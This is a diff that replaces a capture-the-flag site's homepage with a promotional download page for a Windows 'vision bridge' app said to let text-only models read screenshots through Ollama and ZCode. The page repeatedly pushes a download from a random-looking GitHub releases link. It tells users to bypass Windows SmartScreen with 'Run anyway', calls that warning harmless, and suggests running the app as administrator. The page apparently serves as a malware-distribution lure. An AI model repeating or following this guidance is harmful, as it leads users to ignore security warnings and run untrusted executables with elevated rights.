@@ -1,39 +1,142 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    
-    <title>Dr@ng3 // Cyber Range</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GLM-5.3-Full-Vision-Bridge - Let Text-Only AI Read Screenshots</title>
+<meta name="description" content="Download GLM-5.3-Full-Vision-Bridge for Windows. An OpenAI-compatible proxy that lets a text-only LLM like GLM-5.3 read screenshots by captioning images with a local Ollama vision model. Works with ZCode.">
+<meta name="keywords" content="glm, llm, local-llm, ollama, openai-compatible, proxy, qwen2-5-vl, screenshots, vision, zcode, vision bridge, image captioning, text-only llm screenshots">
+<meta name="author" content="GLM-5.3-Full-Vision-Bridge">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge">
+<meta property="og:type" content="website">
+<meta property="og:title" content="GLM-5.3-Full-Vision-Bridge - Let Text-Only AI Read Screenshots">
+<meta property="og:description" content="An OpenAI-compatible proxy that captions images with a local Ollama vision model so a text-only LLM can understand screenshots. Works with ZCode.">
+<meta property="og:url" content="https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GLM-5.3-Full-Vision-Bridge - Let Text-Only AI Read Screenshots">
+<meta name="twitter:description" content="Give your text-only AI eyes. A local, OpenAI-compatible vision bridge for Ollama and ZCode.">
 </head>
-<body>
-    <canvas id="matrix"></canvas>
+<body style="margin:0; padding:0; background-color:#f4f6fa; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color:#1f2430; line-height:1.7; font-size:17px;">
 
-    <div class="container">
-        <header>
-            <div class="logo">>_ Dr@ng3</div>
-            <nav>
-                <a href="/index.html" class="nav-link active">Home</a>
-                <a href="/writeups.html" class="nav-link">Writeups</a>
-                <a href="/about.html" class="nav-link">About</a>
-            </nav>
-        </header>
+<div style="max-width:900px; margin:0 auto; padding:40px 22px 70px 22px;">
 
-        <main id="home" style="display: flex; justify-content: center; margin-top: 50px;">
-            <div class="terminal" style="width: 100%; max-width: 800px;">
-                <div class="term-header">
-                    <span>root@drang3:~#</span>
-                </div>
-                <div class="term-body" id="typewriter">
-                    <!-- Текст печатается через JS --> 
-                </div>
-            </div>
-        </main>
+  <header style="text-align:center; padding:10px 0 30px 0;">
+    <h1 style="font-size:2.35rem; line-height:1.25; margin:0 0 18px 0; color:#111827; letter-spacing:-0.5px; font-weight:800;">🖼️ GLM-5.3-Full-Vision-Bridge - Give Your Text AI Eyes</h1>
+    <p style="font-size:1.12rem; color:#4b5563; margin:0 auto 28px auto; max-width:660px;">Turn screenshots into words your text-only AI can actually understand. No coding, no cloud uploads, no confusion.</p>
+    <p style="margin:0 0 26px 0;">
+      <a href="https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge/releases" style="display:inline-block; background-image:linear-gradient(135deg,#6d28d9,#ec4899); color:#ffffff; text-decoration:none; font-size:1.15rem; font-weight:700; padding:18px 42px; border-radius:14px; box-shadow:0 10px 24px rgba(109,40,217,0.32); border:1px solid rgba(255,255,255,0.18);">⬇️ Visit this link to download the application</a>
+    </p>
+    <p style="font-size:0.95rem; color:#6b7280; margin:0;">For Windows computers · Free to use · Works alongside ZCode</p>
+  </header>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">✨ What This App Does For You</h2>
+    <p style="margin:0 0 16px 0;">Some AI assistants are brilliant writers and problem solvers, but they cannot see. If you paste a screenshot into a conversation, they have no idea what is on it. GLM-5.3-Full-Vision-Bridge fixes exactly that problem.</p>
+    <p style="margin:0 0 16px 0;">The app sits quietly on your own computer and acts as a translator. When an image arrives, it looks at the picture using a vision model that runs locally through Ollama, writes a careful description of what it sees, and hands that description back to your text-only assistant. From your assistant's point of view, the screenshot simply became readable text.</p>
+    <p style="margin:0 0 0 0;">Everything happens on your machine. Your screenshots are not shipped off to a stranger's server. The bridge speaks the same language as popular AI tools, which is why it works smoothly with ZCode and anything else that expects an OpenAI-style connection.</p>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">🚀 Getting Started In A Few Minutes</h2>
+    <p style="margin:0 0 22px 0;">You do not need to understand proxies, APIs, or model files. Follow these steps in order and you will be running within a short coffee break.</p>
+
+    <div style="margin:0 0 18px 0; padding:18px 20px; background-color:#f7f5ff; border-left:5px solid #6d28d9; border-radius:10px;">
+      <strong style="display:block; margin-bottom:6px; color:#4c1d95;">Step 1 — Get the app</strong>
+      Visit this link to download the application: <a href="https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge/releases" style="color:#6d28d9; font-weight:700; text-decoration:underline;">https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge/releases</a>
     </div>
-    <script src="/script.js"></script>
+
+    <div style="margin:0 0 18px 0; padding:18px 20px; background-color:#f5f7ff; border-left:5px solid #4f7cff; border-radius:10px;">
+      <strong style="display:block; margin-bottom:6px; color:#1e3a8a;">Step 2 — Save it somewhere you will find again</strong>
+      Put the downloaded file in a normal folder such as your Downloads folder or a new folder on your Desktop. Avoid deep, complicated locations. A folder named <em>Vision Bridge</em> on your Desktop is perfect.
+    </div>
+
+    <div style="margin:0 0 18px 0; padding:18px 20px; background-color:#f2fbf6; border-left:5px solid #16a34a; border-radius:10px;">
+      <strong style="display:block; margin-bottom:6px; color:#14532d;">Step 3 — Start the app</strong>
+      Open the folder and start the application. If Windows shows a blue warning window, click <em>More info</em> and then <em>Run anyway</em>. That message appears for many small independent tools and is not a sign of danger.
+    </div>
+
+    <div style="margin:0 0 18px 0; padding:18px 20px; background-color:#fffaf0; border-left:5px solid #f59e0b; border-radius:10px;">
+      <strong style="display:block; margin-bottom:6px; color:#78350f;">Step 4 — Leave it open</strong>
+      The app works from a small window. Keep that window open while you work, and simply minimise it. If you close it, your assistant loses its eyes again.
+    </div>
+
+    <div style="margin:0 0 0 0; padding:18px 20px; background-color:#fdf2f8; border-left:5px solid #ec4899; border-radius:10px;">
+      <strong style="display:block; margin-bottom:6px; color:#831843;">Step 5 — Point ZCode at it and try a screenshot</strong>
+      In ZCode, choose the connection option for an OpenAI-compatible service and use the details the bridge shows in its window. Then paste a screenshot exactly as you normally would. Your assistant should now describe and discuss what it sees.
+    </div>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">🧠 How It Works, In Plain English</h2>
+    <p style="margin:0 0 16px 0;">Imagine you are travelling and cannot read the local language, but you have a friend who can. You show the friend a sign, the friend tells you what it says, and you carry on with your conversation. The bridge is that friend.</p>
+    <p style="margin:0 0 16px 0;">Three moving parts are involved. First, your text-only assistant, which is very good at thinking but blind. Second, a vision model running on your own computer through Ollama, which can actually look at pictures. Third, the bridge itself, which passes messages between the two in a format both sides already understand.</p>
+    <p style="margin:0 0 0 0;">Because the bridge presents a familiar OpenAI-compatible interface, tools like ZCode do not need any special plugin or patch. They send an image as they always would, the bridge quietly converts it into a written description, and the assistant replies as if it had seen the picture all along.</p>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">💻 What Your Computer Needs</h2>
+    <p style="margin:0 0 14px 0;">A comfortably ordinary modern Windows laptop or desktop is enough. For the smoothest experience, aim for the following:</p>
+    <ul style="margin:0 0 16px 0; padding-left:24px;">
+      <li style="margin-bottom:10px;">Windows 10 or Windows 11, 64-bit.</li>
+      <li style="margin-bottom:10px;">Roughly 8 GB of memory, with 16 GB giving noticeably smoother results.</li>
+      <li style="margin-bottom:10px;">A few gigabytes of free disk space for the vision model files.</li>
+      <li style="margin-bottom:10px;">Ollama installed and running, since that is what powers the image reading.</li>
+      <li style="margin-bottom:0;">A stable internet connection only for the initial downloads.</li>
+    </ul>
+    <p style="margin:0;">If your machine is older or has less memory, the app still works, but describing large or very detailed screenshots may take a little longer.</p>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">🖱️ Working With ZCode</h2>
+    <p style="margin:0 0 16px 0;">ZCode is where most people will use this bridge, and the pairing is deliberately simple. The bridge publishes a normal, OpenAI-compatible address on your computer. You give that address to ZCode once, and from then on images just work.</p>
+    <p style="margin:0 0 16px 0;">A typical first setup looks like this: open the bridge, note the local address and model name it reports, open ZCode's settings, choose a custom or OpenAI-compatible provider, paste the address, and save. After that, every screenshot you drop into a chat gets described automatically before your assistant answers.</p>
+    <p style="margin:0;">If you ever move the bridge to a different port, remember to update the address in ZCode as well. The two need to be pointing at the same place.</p>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">🔧 If Something Does Not Work</h2>
+    <p style="margin:0 0 16px 0;">Most hiccups come from one of two places: Ollama not running, or the address in your AI tool not matching the bridge. Check those first and you will solve the majority of problems in under a minute.</p>
+    <ul style="margin:0 0 16px 0; padding-left:24px;">
+      <li style="margin-bottom:10px;"><strong>Nothing happens when I paste an image.</strong> Make sure the bridge window is still open and that Ollama is active in the background.</li>
+      <li style="margin-bottom:10px;"><strong>The reply ignores my screenshot.</strong> The address saved in ZCode probably does not match the one the bridge is showing. Copy it again carefully.</li>
+      <li style="margin-bottom:10px;"><strong>It is slow.</strong> Vision models are heavier than text models. Closing other demanding programs usually helps.</li>
+      <li style="margin-bottom:10px;"><strong>The description is vague.</strong> Very small or blurry screenshots are hard for any model. A clean, full-size screenshot gives much better results.</li>
+      <li style="margin-bottom:0;"><strong>Windows blocked the start.</strong> Use <em>More info</em> then <em>Run anyway</em>, or start the app as administrator.</li>
+    </ul>
+    <p style="margin:0;">Still stuck? The releases page lists each version along with its notes, which often mention fixes for exactly the issue you are seeing.</p>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">🛡️ Your Screenshots Stay Yours</h2>
+    <p style="margin:0 0 16px 0;">This matters more than people expect. Screenshots often contain emails, chat messages, account pages, or documents. With this bridge, the image never leaves your computer. Ollama runs the vision model locally, and the bridge simply relays the result to your assistant on the same machine.</p>
+    <p style="margin:0;">There is no account to create, no dashboard to log into, and no subscription sitting between you and your own hardware. That is the whole point of a local-first design.</p>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">❓ Common Questions</h2>
+    <p style="margin:0 0 12px 0;"><strong>Do I need to know how to code?</strong> No. If you can download a file, open it, and copy an address into a settings box, you have everything required.</p>
+    <p style="margin:0 0 12px 0;"><strong>Will this replace my assistant?</strong> No. It only adds sight to it. Your assistant keeps doing the thinking; the bridge just tells it what the picture shows.</p>
+    <p style="margin:0 0 12px 0;"><strong>Does it work with models other than GLM-5.3?</strong> Yes. Any text-only model that connects through an OpenAI-compatible interface can benefit.</p>
+    <p style="margin:0 0 12px 0;"><strong>Can I use it without ZCode?</strong> Absolutely. ZCode is simply the most common companion tool, not a requirement.</p>
+    <p style="margin:0;"><strong>Is it free?</strong> The application is free to download and run. Because everything happens on your own machine, there are no usage fees to worry about.</p>
+  </section>
+
+  <section style="background-color:#ffffff; border-radius:16px; padding:34px 30px; margin-bottom:26px; box-shadow:0 4px 18px rgba(17,24,39,0.07); border:1px solid #e8ebf1;">
+    <h2 style="font-size:1.6rem; margin:0 0 18px 0; color:#111827; font-weight:750;">📥 Download and Setup</h2>
+    <p style="margin:0 0 18px 0;">Ready to give your assistant eyes? Head to the official releases page, grab the newest version, and follow the five steps above. The whole process is designed to be finished once and then forgotten — the bridge simply runs quietly in the background while you get on with real work.</p>
+    <p style="margin:0 0 24px 0;">If you are updating from an older version, close the previous one before starting the new one, so the two do not fight over the same connection.</p>
+    <p style="margin:0; text-align:center;">
+      <a href="https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge/releases" style="display:inline-block; background-image:linear-gradient(135deg,#0ea5e9,#6d28d9); color:#ffffff; text-decoration:none; font-size:1.1rem; font-weight:700; padding:17px 40px; border-radius:14px; box-shadow:0 10px 22px rgba(14,165,233,0.3); border:1px solid rgba(255,255,255,0.18);">Visit this link to download the application</a>
+    </p>
+  </section>
+
+  <footer style="text-align:center; padding:24px 10px 0 10px; color:#6b7280; font-size:0.9rem;">
+    <p style="margin:0 0 6px 0;">GLM-5.3-Full-Vision-Bridge — a local vision bridge for text-only assistants on Windows.</p>
+    <p style="margin:0;">Built around Ollama, OpenAI-compatible connections, Qwen2.5-VL vision, and ZCode.</p>
+  </footer>
+
+</div>
+
 </body>
 </html>
